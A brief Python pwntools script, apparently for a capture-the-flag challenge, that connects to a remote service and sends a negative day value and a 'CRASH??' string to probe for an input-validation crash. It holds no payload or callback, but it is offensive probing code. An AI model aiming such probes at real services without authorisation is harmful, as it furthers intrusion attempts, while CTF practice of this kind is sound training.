#!/usr/bin/env python3
from pwn import *

HOST = 'pwn.runa2025.kr'
PORT = 7004

p = remote(HOST, PORT)

# Try negative day
p.recvuntil(b'>')
p.sendline(b'1')
p.recvuntil(b':')
p.sendline(b'-10')  # negative day
p.recvuntil(b':')
p.sendline(b'8')
p.recvuntil(b':')
p.sendline(b'10')
p.recvuntil(b':')
p.send(b'CRASH??')

try:
    data = p.recv(timeout=3)
    print("Received:", data)
except:
    print("Timeout or crash")

p.close()
